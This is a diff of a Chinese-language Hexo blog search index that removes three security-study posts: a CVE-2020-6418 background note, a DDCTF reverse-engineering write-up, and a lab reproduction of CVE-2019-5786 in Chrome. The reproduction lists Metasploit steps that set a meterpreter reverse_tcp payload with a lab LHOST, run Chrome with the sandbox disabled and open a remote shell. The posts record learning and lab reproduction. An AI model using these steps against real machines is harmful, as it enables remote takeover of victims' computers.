@@ -4,25 +4,6 @@
   
   
   <entry>
-    <title>CVE-2020-6418</title>
-    <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2020-6418/"/>
-    <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2020-6418/</url>
-    
-    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>(资料来自绿盟科技)</p><p>2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.</p><p>CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。</p><p>受影响产品版本：</p><p>Google Chrome Version&lt;80.0.3987.122</p><p>适用于windows,Mac,Linux.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.nsfocus.net/cve-2020-6418">http://blog.nsfocus.net/cve-2020-6418</a></p>]]></content>
-    
-    
-    
-    <tags>
-      
-      <tag>chrome调试</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>burp四种密码爆破模式学习</title>
     <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
     <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
@@ -72,44 +53,6 @@
     <tags>
       
       <tag>学习笔记</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>DDCTF RE windows_re2</title>
-    <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/DDCTF2019re/"/>
-    <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/DDCTF2019re/</url>
-    
-    <content type="html"><![CDATA[<p>esp定律脱壳Aspack，然后ida分析一波。</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> sub<span class="hljs-constructor">_401320()</span><br>{<br>  <span class="hljs-built_in">char</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-C04h]</span><br>  <span class="hljs-built_in">char</span> v2; <span class="hljs-comment">// [esp+9h] [ebp-C03h]</span><br>  <span class="hljs-built_in">char</span> v3; <span class="hljs-comment">// [esp+408h] [ebp-804h]</span><br>  <span class="hljs-built_in">char</span> v4; <span class="hljs-comment">// [esp+409h] [ebp-803h]</span><br>  <span class="hljs-built_in">char</span> v5; <span class="hljs-comment">// [esp+808h] [ebp-404h]</span><br>  <span class="hljs-built_in">char</span> v6; <span class="hljs-comment">// [esp+809h] [ebp-403h]</span><br>  v3 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v4</span>, 0, 0x3FF)</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v6</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"input code:"</span>);<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785526D4</span>]</span>(<span class="hljs-string">"%s"</span>, &amp;v3);<br>  <span class="hljs-keyword">if</span> ( !(unsigned __int8)sub<span class="hljs-constructor">_4011F0()</span> )<br>  {<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"invalid input\n"</span>);<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78542455</span>]</span>(<span class="hljs-number">0</span>);<br>  }<br>  sub<span class="hljs-constructor">_401240(&amp;<span class="hljs-params">v5</span>)</span>;<br>  v1 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v2</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78552E73</span>]</span>(&amp;v1, <span class="hljs-string">"DDCTF{%s}"</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( !strcmp(&amp;v1, <span class="hljs-string">"DDCTF{reverse+}"</span>) )<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"You've got it !!! %s\n"</span>, &amp;v1);<br>  <span class="hljs-keyword">else</span><br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"Something wrong. Try again...\n"</span>);<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>限制输入0-9,A-F,可想到十六进制</li><li>输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。</li></ul><p>先尝试输入字符串<code>1234567AAA</code>,得到加密后字符 <code>EjRWeqo=</code>,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。<br>将<code>reverse+</code>转换得到flag</p>]]></content>
-    
-    
-    
-    <tags>
-      
-      <tag>RE</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>CVE-2019-5786</title>
-    <link href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-5786/"/>
-    <url>/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-5786/</url>
-    
-    <content type="html"><![CDATA[<p>前言：</p><p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali<br>win7_x86<br>Google_chrome_(32bit)_v72.0.3626.119</p><p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p><p><code>root@kali:~# msfconsole -q</code></p><p><code>msf5 &gt; search chrome_filereader</code></p><blockquote><p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p></blockquote><p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p><p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p><h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p><ul><li><p>readyState：表示读取状态</p><ul><li>empty,0,尚未读取</li><li>loading,1,正在读取</li><li>done,2,读取完成</li></ul></li><li><p>result：表示读取结果，具体格式与读取方式有关：</p><ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><p>onprogress：回调函数</p><ul><li>读取Blob触发</li><li>当数据较多时会周期性触发多次</li></ul></li><li><p>onloadend：回调函数</p><ul><li>读取操作完成时触发，不论读取成功或失败</li></ul></li></ul><p>查看模块信息</p><p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p><p>漏洞介绍：</p><pre><code class="Payload">Description:  This exploit takes advantage of a use after free vulnerability in   Google Chrome 72.0.3626.119 running on Windows 7 x86. The   FileReader.readAsArrayBuffer function can return multiple references   to the same ArrayBuffer object, which can be freed and overwritten   with sprayed objects. The dangling ArrayBuffer reference can be used   to access the sprayed objects, allowing arbitrary memory access from   Javascript. This is used to write and execute shellcode in a   WebAssembly object. The shellcode is executed within the Chrome   sandbox, so you must explicitly disable the sandbox for the payload   to be successful.```选择payload`-&gt; set payload windows/meterpreter/reverse_tcp`&gt; 注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”设置payload参数：LHOST为kali ip`-&gt; set LHOST 192.168.119.128 `![捕获.PNG](https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png)创建服务 `-&gt; set payload windows/meterpreter/reverse_tcp`![捕获.PNG](https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png)启动服务：run 或者exploit在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe`-&gt; chrome.exe --no-sandbox`在弹出的chome浏览器中访问kali ip:http://192.168.119.128:8080kali获得sessions查看sessions序号，通过反弹shell在win7上可执行命令。复现结束。### 后记在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……### EXPexp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。https://github.com/exodusintel/CVE-2019-5786 </code></pre>]]></content>
-    
-    
-    
-    <tags>
-      
-      <tag>chrome_bug</tag>
       
     </tags>
     
